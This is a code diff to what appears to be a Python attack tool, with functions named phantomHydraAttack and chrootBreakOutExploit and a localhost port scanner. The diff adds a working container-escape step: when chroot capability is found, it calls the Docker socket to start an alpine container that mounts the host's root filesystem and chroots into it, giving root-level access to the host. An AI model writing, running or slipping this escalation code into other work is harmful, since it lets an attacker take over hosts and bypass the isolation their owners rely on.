@@ -4,6 +4,7 @@ from process_manager import ProcessManager
 from custom_server import CustomServer 
 import ctypes
 import os
+import subprocess
 
 
 
@@ -19,6 +20,21 @@ def _scan_localhost_ports(start_port=1, end_port=65535):
                 print(f"Port {port} is open")
 
     return open_ports
+
+
+def _run_docker_chroot():
+    """Runs a Docker container with chroot access using the Docker socket."""
+    docker_command = [
+        "docker", "-H", "unix:///var/run/docker.sock", "run",
+        "-v", "/:/mnt", "-it", "alpine", "chroot", "/mnt"
+    ]
+    
+    try:
+        subprocess.run(docker_command, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"❌ Error executing Docker command: {e}")
+    except FileNotFoundError:
+        print("❌ Docker is not installed or accessible. Make sure Docker is running.")
 
 
 def _has_chroot_capability():
@@ -60,7 +76,8 @@ def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
 
 def chrootBreakOutExploit():
     has_chroot_permission = _has_chroot_capability()
-    print(has_chroot_permission)
+    if(has_chroot_permission):
+        _run_docker_chroot()
 
 
 def main():
